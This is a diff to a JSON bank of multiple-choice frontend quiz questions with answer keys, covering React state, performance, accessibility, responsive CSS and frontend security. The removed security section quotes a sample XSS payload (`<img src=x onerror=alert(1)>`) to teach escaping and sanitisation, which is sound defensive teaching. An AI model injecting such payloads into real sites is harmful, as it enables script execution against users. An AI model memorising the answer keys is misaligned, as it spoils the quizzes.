@@ -7,11 +7,89 @@
     {
       "id": "components",
       "title": "Components",
+      "summary": "Reusable, composable UI components and their lifecycle",
       "concepts": [
+        {
+          "id": "frontend/components/props-down-events-up",
+          "title": "Props down, events up",
+          "summary": "Parents pass data to children as props; children report changes back through callbacks instead of changing props",
+          "level": "easy",
+          "variants": [
+            {
+              "lang": "ts",
+              "q": "```tsx\nfunction Counter({ count }: { count: number }) {\n  return <button onClick={() => count++}>{count}</button>;\n}\n```\nWhy doesn't clicking the button change the number?",
+              "choices": [
+                "The parent must own the state and pass a callback such as `onIncrement`",
+                "`count++` must be written as `count += 1` for React to notice it",
+                "Buttons can only change props when they're inside a `<form>` element",
+                "The returned JSX needs to be wrapped in a `useMemo` call to update"
+              ],
+              "answer": 0,
+              "explain": "Reassigning a prop only changes a local variable in that render, and nothing re-renders. The parent holds the state and passes a callback the child calls: data flows down, changes flow up."
+            },
+            {
+              "lang": null,
+              "q": "In a component-based UI (React, Vue and Svelte alike), a `SearchBox` child needs to tell its parent page that the user typed a new query, so the page can refetch results. What is the usual design?",
+              "choices": [
+                "The child reaches into the parent's state and edits it directly",
+                "The parent passes a callback such as `onQueryChange`; the child calls it",
+                "The child writes the query to a global variable that the parent polls",
+                "The child reloads the whole page with the query string attached"
+              ],
+              "answer": 1,
+              "explain": "The child emits an event (a callback prop in React, an emitted event in Vue) and the parent decides what to do. Editing the parent's state directly ties the child to one parent and breaks one-way data flow."
+            },
+            {
+              "lang": null,
+              "q": "A `Modal` gets `isOpen` from its parent. To support its close button, the modal copies `isOpen` into its own local state and sets that to `false` on close. What goes wrong?",
+              "choices": [
+                "Nothing, as long as the modal has a close animation",
+                "The modal closes and the parent's value updates to match",
+                "The parent still holds `true`, so the modal can't be reopened",
+                "The framework merges the two values on the next render"
+              ],
+              "answer": 2,
+              "explain": "Two owners of one value drift apart: the parent never learned the modal closed. The parent should own `isOpen` and pass an `onClose` callback the modal calls."
+            }
+          ]
+        },
+        {
+          "id": "frontend/components/composition-children",
+          "title": "Composition with children",
+          "summary": "Building flexible components by passing content in (`children`, slots) instead of adding a prop per variation",
+          "level": "easy",
+          "variants": [
+            {
+              "lang": null,
+              "q": "A `Card` component has grown the props `showIcon`, `iconName`, `title`, `subtitle`, `showFooter`, `footerText` and `footerButtonLabel`, and every new screen needs another one. What is the usual refactor?",
+              "choices": [
+                "Group all of the options into a single `config` object prop",
+                "Move the options into global CSS classes that callers can toggle",
+                "Copy the component once per screen so each copy stays simple",
+                "Let callers pass body and footer content as children or slots"
+              ],
+              "answer": 3,
+              "explain": "Composition lets the caller decide what goes inside, so the component stays small and stops growing a prop for each case. A `config` object just moves the same flags into one place."
+            },
+            {
+              "lang": null,
+              "q": "Which design makes a `Dialog` component easiest to reuse across many different screens?",
+              "choices": [
+                "`Dialog` takes its title, body and actions as content supplied by the caller",
+                "`Dialog` imports every screen's form and picks one using a `type` prop",
+                "Each screen keeps its own copy of the dialog's markup and styles",
+                "`Dialog` looks up which content to show in a global store"
+              ],
+              "answer": 0,
+              "explain": "When the caller supplies the content, the dialog handles only the shared behaviour (overlay, focus, closing) and needs no change for new screens. A `type` switch means editing the dialog every time a new use appears."
+            }
+          ]
+        },
         {
           "id": "frontend/components/controlled-inputs",
           "title": "Controlled vs uncontrolled inputs",
           "summary": "Whether React state (`value` + `onChange`) or the DOM itself owns an input's current value",
+          "level": "medium",
           "variants": [
             {
               "lang": "ts",
@@ -43,6 +121,7 @@
           "id": "frontend/components/list-keys",
           "title": "Keys in lists",
           "summary": "Giving list items stable, unique `key`s so React matches each item's state to the right row",
+          "level": "easy",
           "variants": [
             {
               "lang": "ts",
@@ -71,40 +150,10 @@
           ]
         },
         {
-          "id": "frontend/components/key-reset",
-          "title": "Resetting state with a key",
-          "summary": "Changing a component's `key` to make React throw away its state and mount a fresh one",
-          "variants": [
-            {
-              "lang": "ts",
-              "q": "`<ProfileForm userId={id} />` keeps the previous user's half-typed form data when you switch users. Which change resets the form whenever the user changes?",
-              "choices": [
-                "Wrap `ProfileForm` in `React.memo`",
-                "Add `key={id}` to `ProfileForm`",
-                "Call `forceUpdate()` when `id` changes",
-                "Move the form state into a `useRef`"
-              ],
-              "answer": 1,
-              "explain": "A new `key` tells React this is a different component instance, so it unmounts the old one and mounts a new one with fresh state. Re-rendering (memo or not) keeps the existing state."
-            },
-            {
-              "lang": "ts",
-              "q": "A chat window is rendered as `<Chat key={roomId} roomId={roomId} />`. What happens to `Chat`'s state and effects when `roomId` changes?",
-              "choices": [
-                "State is kept; only the props update",
-                "State is kept, but all effects rerun",
-                "It remounts with fresh state",
-                "React throws, since `key` duplicates a prop"
-              ],
-              "answer": 2,
-              "explain": "Different key, different instance: React runs the old instance's effect cleanups, discards its state and mounts a fresh one. Passing the same value as both `key` and a prop is normal."
-            }
-          ]
-        },
-        {
           "id": "frontend/components/effect-cleanup",
           "title": "Effect cleanup",
           "summary": "Returning a cleanup function from `useEffect` to undo subscriptions, timers and listeners",
+          "level": "medium",
           "variants": [
             {
               "lang": "ts",
@@ -136,6 +185,7 @@
           "id": "frontend/components/derived-state",
           "title": "Derived state instead of copied props",
           "summary": "Computing values from props and state during render instead of copying them into extra state",
+          "level": "medium",
           "variants": [
             {
               "lang": "ts",
@@ -162,17 +212,115 @@
               "explain": "Values that can be computed from existing props or state shouldn't be state. The effect version renders once with a stale `fullName`, then again with the right one."
             }
           ]
+        },
+        {
+          "id": "frontend/components/key-reset",
+          "title": "Resetting state with a key",
+          "summary": "Changing a component's `key` to make React throw away its state and mount a fresh one",
+          "level": "hard",
+          "variants": [
+            {
+              "lang": "ts",
+              "q": "`<ProfileForm userId={id} />` keeps the previous user's half-typed form data when you switch users. Which change resets the form whenever the user changes?",
+              "choices": [
+                "Wrap `ProfileForm` in `React.memo`",
+                "Add `key={id}` to `ProfileForm`",
+                "Call `forceUpdate()` when `id` changes",
+                "Move the form state into a `useRef`"
+              ],
+              "answer": 1,
+              "explain": "A new `key` tells React this is a different component instance, so it unmounts the old one and mounts a new one with fresh state. Re-rendering (memo or not) keeps the existing state."
+            },
+            {
+              "lang": "ts",
+              "q": "A chat window is rendered as `<Chat key={roomId} roomId={roomId} />`. What happens to `Chat`'s state and effects when `roomId` changes?",
+              "choices": [
+                "State is kept; only the props update",
+                "State is kept, but all effects rerun",
+                "It remounts with fresh state",
+                "React throws, since `key` duplicates a prop"
+              ],
+              "answer": 2,
+              "explain": "Different key, different instance: React runs the old instance's effect cleanups, discards its state and mounts a fresh one. Passing the same value as both `key` and a prop is normal."
+            }
+          ]
         }
       ]
     },
     {
       "id": "state",
       "title": "State",
+      "summary": "Where UI state lives and choosing a state management approach",
       "concepts": [
+        {
+          "id": "frontend/state/lifting-state-up",
+          "title": "Lifting state up",
+          "summary": "Moving shared state to the closest common parent so the components that need it stay in sync",
+          "level": "easy",
+          "variants": [
+            {
+              "lang": null,
+              "q": "A product page has a `SizePicker` and a `PriceLabel` side by side. The price depends on the chosen size, and right now `SizePicker` keeps the size in its own local state. What is the usual fix?",
+              "choices": [
+                "Have `PriceLabel` read the selected size from the picker's DOM",
+                "Move the size into their common parent's state and pass it to both",
+                "Keep a second copy of the size in `PriceLabel` and sync them with effects",
+                "Move every piece of the page's state into a global store"
+              ],
+              "answer": 1,
+              "explain": "State belongs in the closest component that all of its readers share. A second copy synced by effects gives two sources of truth that drift, and a global store is more than two siblings need."
+            },
+            {
+              "lang": null,
+              "q": "When is local component state the right place for a value, rather than a shared or global store?",
+              "choices": [
+                "Whenever the value is a boolean rather than an object",
+                "Never: all state should be global so it is easy to debug",
+                "When only it and its children use it, like a dropdown's open flag",
+                "Only for values that were fetched from the server"
+              ],
+              "answer": 2,
+              "explain": "Keep state as close as possible to where it is used; a dropdown's open flag concerns nobody else. Fetched data usually belongs in a server-state cache rather than plain local state."
+            }
+          ]
+        },
+        {
+          "id": "frontend/state/url-state",
+          "title": "State in the URL",
+          "summary": "Keeping shareable view state such as filters, sort order and page number in the query string",
+          "level": "easy",
+          "variants": [
+            {
+              "lang": null,
+              "q": "A user filters a product list to \"red, size M, page 3\", copies the URL and sends it to a colleague, who sees the unfiltered first page. What is the fix?",
+              "choices": [
+                "Save the filters in `localStorage` instead of component state",
+                "Show a message asking the colleague to set the filters again",
+                "Store the filters on the server in the user's session",
+                "Keep the filters and page in the URL query string"
+              ],
+              "answer": 3,
+              "explain": "State that defines what's on screen, and should survive refresh, back/forward and sharing, belongs in the URL. `localStorage` and the session are per browser or per user, so the colleague still gets the default view."
+            },
+            {
+              "lang": null,
+              "q": "Which piece of state is the best candidate to keep in the URL?",
+              "choices": [
+                "The selected tab on a settings page that users bookmark",
+                "The text of a comment the user is still typing",
+                "Whether a tooltip is currently showing",
+                "The open WebSocket connection for live updates"
+              ],
+              "answer": 0,
+              "explain": "Bookmarkable, shareable view choices fit the URL. A tooltip's visibility is momentary, and drafts or live objects don't belong in a URL at all."
+            }
+          ]
+        },
         {
           "id": "frontend/state/immutable-updates",
           "title": "Immutable state updates",
           "summary": "Creating new arrays and objects for state changes, because React compares by reference",
+          "level": "medium",
           "variants": [
             {
               "lang": "ts",
@@ -204,30 +352,53 @@
           "id": "frontend/state/functional-updates",
           "title": "Functional state updates",
           "summary": "Passing an updater like `setCount(c => c + 1)` so each update builds on the latest value",
+          "level": "medium",
           "variants": [
             {
               "lang": "ts",
               "q": "`count` starts at 0. What is it after one click?\n\n```tsx\nconst onClick = () => {\n  setCount(count + 1)\n  setCount(count + 1)\n  setCount(count + 1)\n}\n```",
-              "choices": [
-                "1",
-                "3",
-                "0",
-                "It depends on whether React batches"
-              ],
+              "choices": ["1", "3", "0", "It depends on whether React batches"],
               "answer": 0,
               "explain": "All three calls read the same `count` from this render, so each sets it to 1. `setCount(c => c + 1)` three times would give 3, because each updater gets the latest pending value."
             },
             {
               "lang": "ts",
               "q": "`count` starts at 0. What is it after one click?\n\n```tsx\nconst onClick = () => {\n  setCount(c => c + 1)\n  setCount(c => c + 1)\n}\n```",
-              "choices": [
-                "1",
-                "0",
-                "2",
-                "It throws, because updaters can't be chained"
-              ],
+              "choices": ["1", "0", "2", "It throws, because updaters can't be chained"],
               "answer": 2,
               "explain": "React queues updater functions and runs them in order, each receiving the result of the previous one, so the count goes 0, 1, 2."
+            }
+          ]
+        },
+        {
+          "id": "frontend/state/server-state-cache",
+          "title": "Server state caching",
+          "summary": "Treating fetched data as a cache keyed by query (TanStack Query, SWR), separate from UI state",
+          "level": "medium",
+          "variants": [
+            {
+              "lang": "ts",
+              "q": "Switching pages shows the same todos every time. What's wrong?\n\n```tsx\nconst { data } = useQuery({\n  queryKey: ['todos'],\n  queryFn: () => fetchTodos(page),\n})\n```",
+              "choices": [
+                "`queryFn` must be declared outside the component",
+                "TanStack Query caches only the first page by default",
+                "`page` must be passed as a separate query option",
+                "`page` is missing from `queryKey`"
+              ],
+              "answer": 3,
+              "explain": "The query key identifies the cached data; anything the fetch depends on must be in it. Use `queryKey: ['todos', page]` so each page has its own entry and changing it triggers a fetch."
+            },
+            {
+              "lang": "ts",
+              "q": "Two components mounted at the same time both call `useQuery({ queryKey: ['user', id], ... })` with the same `id`. How many requests does TanStack Query make?",
+              "choices": [
+                "Two, one per component that calls `useQuery`",
+                "One, shared by both components",
+                "None until one of them calls `refetch()`",
+                "One per render of each of the two components"
+              ],
+              "answer": 1,
+              "explain": "Queries with the same key share one cache entry, so concurrent consumers are deduplicated into a single fetch. This is a main reason to use a server-state library instead of fetching in each component's effect."
             }
           ]
         },
@@ -235,6 +406,7 @@
           "id": "frontend/state/stale-closures",
           "title": "Stale closures in hooks",
           "summary": "Callbacks created in one render keep seeing that render's state unless they are recreated",
+          "level": "hard",
           "variants": [
             {
               "lang": "ts",
@@ -266,6 +438,7 @@
           "id": "frontend/state/context-rerenders",
           "title": "Context re-renders",
           "summary": "Every consumer re-renders when a context value changes, including when it's a new object each render",
+          "level": "hard",
           "variants": [
             {
               "lang": "ts",
@@ -292,48 +465,19 @@
               "explain": "`memo` skips re-renders caused by the parent with equal props, but a component that reads a context always re-renders when that context's value changes."
             }
           ]
-        },
-        {
-          "id": "frontend/state/server-state-cache",
-          "title": "Server state caching",
-          "summary": "Treating fetched data as a cache keyed by query (TanStack Query, SWR), separate from UI state",
-          "variants": [
-            {
-              "lang": "ts",
-              "q": "Switching pages shows the same todos every time. What's wrong?\n\n```tsx\nconst { data } = useQuery({\n  queryKey: ['todos'],\n  queryFn: () => fetchTodos(page),\n})\n```",
-              "choices": [
-                "`queryFn` must be declared outside the component",
-                "TanStack Query caches only the first page by default",
-                "`page` must be passed as a separate query option",
-                "`page` is missing from `queryKey`"
-              ],
-              "answer": 3,
-              "explain": "The query key identifies the cached data; anything the fetch depends on must be in it. Use `queryKey: ['todos', page]` so each page has its own entry and changing it triggers a fetch."
-            },
-            {
-              "lang": "ts",
-              "q": "Two components mounted at the same time both call `useQuery({ queryKey: ['user', id], ... })` with the same `id`. How many requests does TanStack Query make?",
-              "choices": [
-                "Two, one per component that calls `useQuery`",
-                "One, shared by both components",
-                "None until one of them calls `refetch()`",
-                "One per render of each of the two components"
-              ],
-              "answer": 1,
-              "explain": "Queries with the same key share one cache entry, so concurrent consumers are deduplicated into a single fetch. This is a main reason to use a server-state library instead of fetching in each component's effect."
-            }
-          ]
         }
       ]
     },
     {
       "id": "performance",
       "title": "Performance",
+      "summary": "Measuring and improving page speed and Core Web Vitals (LCP, CLS, INP)",
       "concepts": [
         {
           "id": "frontend/performance/core-web-vitals",
           "title": "Core Web Vitals",
           "summary": "LCP (loading), INP (responsiveness) and CLS (visual stability), Google's user-experience metrics",
+          "level": "easy",
           "variants": [
             {
               "lang": null,
@@ -371,13 +515,45 @@
               "answer": 3,
               "explain": "LCP times how long the largest visible element, often a hero image or headline, takes to render. Total Blocking Time is a lab metric related to main-thread work, not one of the three Core Web Vitals."
             }
-          ],
-          "basic": true
+          ]
+        },
+        {
+          "id": "frontend/performance/lazy-loading-images",
+          "title": "Lazy-loading images",
+          "summary": "`loading=\"lazy\"` defers offscreen images until they near the viewport; the image at the top should load eagerly",
+          "level": "easy",
+          "variants": [
+            {
+              "lang": null,
+              "q": "A long article has 40 images, and only the first is visible when the page loads. Which markup is a good default for the images further down?",
+              "choices": [
+                "`<img src=\"photo.jpg\" defer alt=\"…\">`",
+                "`<img src=\"photo.jpg\" loading=\"lazy\" alt=\"…\">`",
+                "`<img data-src=\"photo.jpg\" alt=\"…\">` with no script",
+                "`<img src=\"photo.jpg\" async alt=\"…\">`"
+              ],
+              "answer": 1,
+              "explain": "Native `loading=\"lazy\"` lets the browser fetch an image only as it gets close to the viewport. `defer` and `async` are `<script>` attributes, and `data-src` without a script never loads at all."
+            },
+            {
+              "lang": null,
+              "q": "A team adds `loading=\"lazy\"` to every image, including the large hero image at the top of the page. What usually happens to Largest Contentful Paint (LCP)?",
+              "choices": [
+                "It improves, because fewer bytes are downloaded at first",
+                "It stays the same, since lazy loading only affects images below the fold",
+                "It gets worse, because the hero image starts downloading later",
+                "It can no longer be measured once lazy loading is on"
+              ],
+              "answer": 2,
+              "explain": "The hero is usually the LCP element, and lazy-loading delays its download. Load images above the fold eagerly (optionally with `fetchpriority=\"high\"`) and lazy-load the rest."
+            }
+          ]
         },
         {
           "id": "frontend/performance/code-splitting",
           "title": "Code splitting",
           "summary": "Loading parts of the app on demand with dynamic `import()` instead of in one big bundle",
+          "level": "medium",
           "variants": [
             {
               "lang": "ts",
@@ -406,40 +582,10 @@
           ]
         },
         {
-          "id": "frontend/performance/memo-referential-equality",
-          "title": "Memoization and referential equality",
-          "summary": "`React.memo` only skips a render when every prop is the same reference, so new objects and functions defeat it",
-          "variants": [
-            {
-              "lang": "ts",
-              "q": "`Row` is wrapped in `React.memo`, yet every row re-renders when the parent does. Why?\n\n```tsx\n{rows.map(r => (\n  <Row key={r.id} row={r} onSelect={() => select(r.id)} />\n))}\n```",
-              "choices": [
-                "`memo` doesn't work for components rendered inside `map`",
-                "`onSelect` is a new function every render",
-                "Passing a `key` prop disables memoization",
-                "`row` objects are deep-compared and always differ"
-              ],
-              "answer": 1,
-              "explain": "`memo` does a shallow comparison by reference, and an inline arrow is a new function each time. Pass a stable callback (for example `useCallback` and `onSelect={select}` with the id passed inside `Row`)."
-            },
-            {
-              "lang": "ts",
-              "q": "A memoized `Chart` gets `options={{ color: 'red' }}` from its parent. Which change lets `memo` skip re-renders when nothing else changes?",
-              "choices": [
-                "Hoist it to a constant or use `useMemo`",
-                "Pass `options={Object.freeze({ color: 'red' })}` instead",
-                "Add `options` to `Chart`'s `key` prop",
-                "Convert `Chart` to a class component"
-              ],
-              "answer": 0,
-              "explain": "An object literal in JSX is a new reference every render, so the shallow prop check fails. A constant or `useMemo` keeps the same reference across renders."
-            }
-          ]
-        },
-        {
           "id": "frontend/performance/list-virtualization",
           "title": "List virtualization",
           "summary": "Rendering only the rows in view for very long lists (react-window, TanStack Virtual)",
+          "level": "medium",
           "variants": [
             {
               "lang": null,
@@ -468,9 +614,49 @@
           ]
         },
         {
+          "id": "frontend/performance/react-profiler",
+          "title": "Profiling renders with React DevTools",
+          "summary": "Recording interactions in the React DevTools Profiler to see which components render and why",
+          "level": "medium",
+          "variants": []
+        },
+        {
+          "id": "frontend/performance/memo-referential-equality",
+          "title": "Memoization and referential equality",
+          "summary": "`React.memo` only skips a render when every prop is the same reference, so new objects and functions defeat it",
+          "level": "hard",
+          "variants": [
+            {
+              "lang": "ts",
+              "q": "`Row` is wrapped in `React.memo`, yet every row re-renders when the parent does. Why?\n\n```tsx\n{rows.map(r => (\n  <Row key={r.id} row={r} onSelect={() => select(r.id)} />\n))}\n```",
+              "choices": [
+                "`memo` doesn't work for components rendered inside `map`",
+                "`onSelect` is a new function every render",
+                "Passing a `key` prop disables memoization",
+                "`row` objects are deep-compared and always differ"
+              ],
+              "answer": 1,
+              "explain": "`memo` does a shallow comparison by reference, and an inline arrow is a new function each time. Pass a stable callback (for example `useCallback` and `onSelect={select}` with the id passed inside `Row`)."
+            },
+            {
+              "lang": "ts",
+              "q": "A memoized `Chart` gets `options={{ color: 'red' }}` from its parent. Which change lets `memo` skip re-renders when nothing else changes?",
+              "choices": [
+                "Hoist it to a constant or use `useMemo`",
+                "Pass `options={Object.freeze({ color: 'red' })}` instead",
+                "Add `options` to `Chart`'s `key` prop",
+                "Convert `Chart` to a class component"
+              ],
+              "answer": 0,
+              "explain": "An object literal in JSX is a new reference every render, so the shallow prop check fails. A constant or `useMemo` keeps the same reference across renders."
+            }
+          ]
+        },
+        {
           "id": "frontend/performance/layout-thrashing",
           "title": "Layout thrashing",
           "summary": "Interleaving DOM reads and writes so the browser recalculates layout over and over",
+          "level": "hard",
           "variants": [
             {
               "lang": "ts",
@@ -497,24 +683,19 @@
               "explain": "Batching reads before writes means layout is computed once for the reads and once after the writes. `getComputedStyle` reads also force style and layout work, so swapping APIs doesn't help."
             }
           ]
-        },
-        {
-          "id": "frontend/performance/react-profiler",
-          "title": "Profiling renders with React DevTools",
-          "summary": "Recording interactions in the React DevTools Profiler to see which components render and why",
-          "variants": []
         }
       ]
     },
     {
       "id": "accessibility",
       "title": "Accessibility",
+      "summary": "UIs everyone can use, following WCAG",
       "concepts": [
         {
           "id": "frontend/accessibility/semantic-buttons",
           "title": "Native buttons over clickable divs",
           "summary": "Using `<button>` for actions so keyboard, focus and screen-reader support come built in",
-          "basic": true,
+          "level": "easy",
           "variants": [
             {
               "lang": null,
@@ -558,28 +739,19 @@
           "id": "frontend/accessibility/alt-text",
           "title": "Alt text",
           "summary": "Describing an image's purpose in `alt`, or using `alt=\"\"` when it's purely decorative",
+          "level": "easy",
           "variants": [
             {
               "lang": null,
               "q": "A decorative divider image adds nothing to the content. What should its `alt` attribute be?",
-              "choices": [
-                "Leave `alt` off entirely",
-                "`alt=\"divider image\"`",
-                "`alt=\"\"`",
-                "`alt=\"decorative\"`"
-              ],
+              "choices": ["Leave `alt` off entirely", "`alt=\"divider image\"`", "`alt=\"\"`", "`alt=\"decorative\"`"],
               "answer": 2,
               "explain": "An empty `alt` marks the image as decorative and screen readers skip it. Leaving `alt` off is worse: many screen readers then read the file name."
             },
             {
               "lang": null,
               "q": "A link contains only a magnifying-glass icon image and goes to the search page. What is the best `alt` for the image?",
-              "choices": [
-                "`alt=\"Search\"`",
-                "`alt=\"magnifying glass icon\"`",
-                "`alt=\"\"`",
-                "`alt=\"click here\"`"
-              ],
+              "choices": ["`alt=\"Search\"`", "`alt=\"magnifying glass icon\"`", "`alt=\"\"`", "`alt=\"click here\"`"],
               "answer": 0,
               "explain": "When an image is a link's only content, its `alt` becomes the link's name, so it should say where the link goes or what it does. Describing the picture tells users nothing useful, and an empty `alt` leaves the link unnamed."
             },
@@ -587,21 +759,21 @@
               "lang": null,
               "q": "An image is a bar chart showing revenue rising every quarter of the year, and nothing else on the page describes it. Which `alt` serves screen reader users best?",
               "choices": [
-                "`alt=\"Bar chart\"`",
+                "`alt=\"Bar chart of the company's quarterly data\"`",
                 "`alt=\"\"`, because charts are visual content",
-                "`alt=\"Bar chart: revenue rose every quarter this year\"`",
-                "`alt=\"chart.png\"`"
+                "`alt=\"Bar chart: revenue rose each quarter\"`",
+                "`alt=\"revenue-chart-final-v2.png\"`"
               ],
               "answer": 2,
               "explain": "A meaningful image needs alt text that carries its message when nothing nearby does. A file name or only the image type gives no information, and an empty alt tells assistive tech to skip content that matters."
             }
-          ],
-          "basic": true
+          ]
         },
         {
           "id": "frontend/accessibility/form-labels",
           "title": "Labelling form fields",
           "summary": "Associating every input with a `<label>`; a placeholder is not a label",
+          "level": "easy",
           "variants": [
             {
               "lang": "ts",
@@ -630,9 +802,44 @@
           ]
         },
         {
+          "id": "frontend/accessibility/color-contrast",
+          "title": "Colour contrast",
+          "summary": "WCAG AA needs 4.5:1 for normal text and 3:1 for large text against its background",
+          "level": "medium",
+          "variants": [
+            {
+              "lang": null,
+              "q": "Under WCAG 2 level AA, what is the minimum contrast ratio for normal-size body text?",
+              "choices": ["3:1", "7:1", "2:1", "4.5:1"],
+              "answer": 3,
+              "explain": "AA requires 4.5:1 for normal text and 3:1 for large text. 7:1 is the stricter AAA level."
+            },
+            {
+              "lang": null,
+              "q": "A design uses light grey `#999` text on white for form hints, which is below 3:1. What is the accessible fix?",
+              "choices": [
+                "Make the hint text italic",
+                "Darken it to at least 4.5:1",
+                "Add a tooltip repeating the text",
+                "Increase the letter spacing"
+              ],
+              "answer": 1,
+              "explain": "Contrast depends on colour, not style. Italics, spacing or tooltips don't make low-contrast text readable."
+            }
+          ]
+        },
+        {
+          "id": "frontend/accessibility/screen-reader-testing",
+          "title": "Testing with a screen reader",
+          "summary": "Using VoiceOver, NVDA or TalkBack yourself to check that a page can be used without seeing it",
+          "level": "medium",
+          "variants": []
+        },
+        {
           "id": "frontend/accessibility/modal-focus",
           "title": "Focus management in dialogs",
           "summary": "Moving focus into a modal when it opens, keeping it there, and returning it when it closes",
+          "level": "hard",
           "variants": [
             {
               "lang": null,
@@ -661,52 +868,49 @@
           ]
         },
         {
-          "id": "frontend/accessibility/color-contrast",
-          "title": "Colour contrast",
-          "summary": "WCAG AA needs 4.5:1 for normal text and 3:1 for large text against its background",
+          "id": "frontend/accessibility/aria-live",
+          "title": "Live regions (`aria-live`)",
+          "summary": "Marking an area so screen readers announce content that changes without a page load, like a \"Saved\" message",
+          "level": "hard",
           "variants": [
             {
               "lang": null,
-              "q": "Under WCAG 2 level AA, what is the minimum contrast ratio for normal-size body text?",
+              "q": "After clicking Save, a \"Changes saved\" message appears in a `<div>` at the top of the form. Sighted users notice it; screen-reader users hear nothing. What fixes it?",
               "choices": [
-                "3:1",
-                "7:1",
-                "2:1",
-                "4.5:1"
+                "Give the message `tabindex=\"0\"` so it can be reached",
+                "Make the message text larger and bold so it stands out",
+                "Add `aria-hidden=\"true\"` to the rest of the form",
+                "Put the text in an existing `role=\"status\"` element"
               ],
               "answer": 3,
-              "explain": "AA requires 4.5:1 for normal text and 3:1 for large text. 7:1 is the stricter AAA level."
+              "explain": "Screen readers announce changes inside a live region (`role=\"status\"` is a polite one), and the region should exist before the text is inserted so the change is noticed. A tabindex makes it focusable but doesn't move focus or announce anything."
             },
             {
               "lang": null,
-              "q": "A design uses light grey `#999` text on white for form hints, which is below 3:1. What is the accessible fix?",
+              "q": "What is the difference between `aria-live=\"polite\"` and `aria-live=\"assertive\"`?",
               "choices": [
-                "Make the hint text italic",
-                "Darken it to at least 4.5:1",
-                "Add a tooltip repeating the text",
-                "Increase the letter spacing"
+                "Polite waits until the screen reader finishes speaking; assertive interrupts it",
+                "Polite only works on buttons; assertive works on any element",
+                "Polite announces once; assertive repeats until it's dismissed",
+                "Polite is for visible text; assertive is for visually hidden text"
               ],
-              "answer": 1,
-              "explain": "Contrast depends on colour, not style. Italics, spacing or tooltips don't make low-contrast text readable."
+              "answer": 0,
+              "explain": "Assertive is for urgent messages, such as an error that needs attention now. Most status updates should be polite, so they don't cut off what the user is listening to."
             }
           ]
-        },
-        {
-          "id": "frontend/accessibility/screen-reader-testing",
-          "title": "Testing with a screen reader",
-          "summary": "Using VoiceOver, NVDA or TalkBack yourself to check that a page can be used without seeing it",
-          "variants": []
         }
       ]
     },
     {
       "id": "responsive-design",
       "title": "Responsive design",
+      "summary": "Layouts that work on every screen size",
       "concepts": [
         {
           "id": "frontend/responsive-design/viewport-meta",
           "title": "Viewport meta tag",
           "summary": "`<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">` so phones use the real screen width",
+          "level": "easy",
           "variants": [
             {
               "lang": null,
@@ -744,13 +948,13 @@
               "answer": 3,
               "explain": "Disabling scaling removes a basic way to enlarge content, which conflicts with WCAG's resize requirements. The width and initial-scale parts are the normal, recommended settings."
             }
-          ],
-          "basic": true
+          ]
         },
         {
           "id": "frontend/responsive-design/mobile-first",
           "title": "Mobile-first media queries",
           "summary": "Writing base styles for small screens and adding `min-width` queries as space grows",
+          "level": "easy",
           "variants": [
             {
               "lang": null,
@@ -782,6 +986,7 @@
           "id": "frontend/responsive-design/responsive-images",
           "title": "Responsive images with srcset and sizes",
           "summary": "Offering several image widths so the browser downloads the one that fits the layout and screen",
+          "level": "medium",
           "variants": [
             {
               "lang": null,
@@ -810,9 +1015,42 @@
           ]
         },
         {
+          "id": "frontend/responsive-design/grid-auto-fit",
+          "title": "Grid `auto-fit` with `minmax()`",
+          "summary": "`repeat(auto-fit, minmax(200px, 1fr))` fits as many columns as there's room for, without media queries",
+          "level": "medium",
+          "variants": [
+            {
+              "lang": null,
+              "q": "```css\n.cards {\n  display: grid;\n  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));\n}\n```\nThere are plenty of cards and no gap. What happens as the container narrows from 1000px to 300px?",
+              "choices": [
+                "The columns stay 200px wide and the grid scrolls sideways",
+                "Columns drop one by one as they'd fall under 200px",
+                "Nothing changes until a media query switches the layout",
+                "All the cards shrink evenly but stay in a single row"
+              ],
+              "answer": 1,
+              "explain": "`auto-fit` creates as many tracks as fit at the 200px minimum, and `1fr` shares out the leftover space, so the column count falls as space shrinks: five columns at 1000px, one at 300px."
+            },
+            {
+              "lang": null,
+              "q": "A grid uses `repeat(auto-fit, minmax(200px, 1fr))` in a 1000px container but holds only two cards, which stretch to 500px each. What change keeps them about 200px wide, with empty space after them?",
+              "choices": [
+                "Set `grid-auto-flow: dense`",
+                "Add `flex-wrap: wrap` to the grid",
+                "Switch `auto-fit` to `auto-fill`",
+                "Set `justify-items: stretch`"
+              ],
+              "answer": 2,
+              "explain": "`auto-fill` keeps the empty tracks, so the two cards take two of five 200px columns. `auto-fit` collapses empty tracks to zero width, which lets `1fr` stretch the cards across the row."
+            }
+          ]
+        },
+        {
           "id": "frontend/responsive-design/container-queries",
           "title": "Container queries",
           "summary": "Styling a component based on its container's size (`@container`) instead of the viewport's",
+          "level": "hard",
           "variants": [
             {
               "lang": null,
@@ -844,6 +1082,7 @@
           "id": "frontend/responsive-design/flex-min-width",
           "title": "Flex and grid items' automatic minimum size",
           "summary": "Flex and grid items won't shrink below their content by default; `min-width: 0` lets them",
+          "level": "hard",
           "variants": [
             {
               "lang": null,
@@ -876,104 +1115,13 @@
     {
       "id": "frontend-security",
       "title": "Frontend security",
+      "summary": "Preventing XSS and CSRF and handling sensitive data in the browser",
       "concepts": [
-        {
-          "id": "frontend/frontend-security/xss-inner-html",
-          "title": "XSS and dangerouslySetInnerHTML",
-          "summary": "React escapes text it renders, but raw HTML you insert can run attacker scripts",
-          "variants": [
-            {
-              "lang": "ts",
-              "q": "A user's comment is `<img src=x onerror=alert(1)>`. What happens when it's rendered with `<p>{comment}</p>`?",
-              "choices": [
-                "It shows as text: React escapes strings",
-                "The image tag runs and the alert fires",
-                "React strips the tag and shows nothing",
-                "React throws an error on HTML in strings"
-              ],
-              "answer": 0,
-              "explain": "React treats a string child as text and escapes it, so no element is created. The danger starts when you use `dangerouslySetInnerHTML` or other raw-HTML APIs."
-            },
-            {
-              "lang": "ts",
-              "q": "User-written Markdown is converted to HTML and shown with `dangerouslySetInnerHTML`. What should happen before rendering?",
-              "choices": [
-                "Nothing: Markdown output can't contain raw HTML",
-                "Encode the HTML with `encodeURIComponent` first",
-                "Wrap it in a `<div>` so any scripts are contained",
-                "Sanitize it with an allow-list sanitizer"
-              ],
-              "answer": 3,
-              "explain": "CommonMark allows raw HTML, and many renderers pass it through, so the output can carry event handlers or scripts. An allow-list sanitizer removes them; URL-encoding would just garble the content."
-            }
-          ]
-        },
-        {
-          "id": "frontend/frontend-security/javascript-urls",
-          "title": "`javascript:` URLs",
-          "summary": "User-supplied links can carry `javascript:` URLs that run code when clicked; validate the scheme",
-          "variants": [
-            {
